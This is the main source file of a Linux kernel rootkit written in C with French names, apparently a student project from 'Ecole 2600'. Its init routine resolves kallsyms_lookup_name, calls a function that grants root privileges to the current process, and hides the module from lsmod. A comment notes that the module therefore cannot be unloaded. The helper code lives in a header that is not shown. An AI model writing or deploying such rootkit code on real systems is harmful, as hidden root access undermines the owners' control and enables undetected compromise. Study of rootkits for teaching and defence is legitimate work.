#include "rootkit_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ecole 2600 Groupe 6");
MODULE_DESCRIPTION("Module principal");
MODULE_VERSION("0.1");

void test_kallsyms_lookup_name(void)
{
    unsigned long addr = recuperer_adresse_kallsyms_lookup_name();
    printk(KERN_INFO "Adresse kallsyms_lookup_name : 0x%px\n",addr);
    printk(KERN_INFO "[OK] KALLSYMS_LOOKUP_NAME\n");
}

void test_avoir_droits_root(void)
{
    avoir_droits_root();
    printk(KERN_INFO "[OK] AVOIR_DROITS_ROOT\n");
}

void test_cacher_le_module_de_lsmod(void)
{
    cacher_le_module_de_lsmod();
    printk(KERN_INFO "[OK] CACHER_LE_MODULE_DE_LSMOD\n");
}

static int __init rootkit_init(void)
{
    test_kallsyms_lookup_name();
    test_avoir_droits_root();
    test_cacher_le_module_de_lsmod();
    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Ne sera pas exécuté car supprimé de la liste des modules (cacher_le_module_de_lsmod()) */
    printk(KERN_INFO "Goodbye, World!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
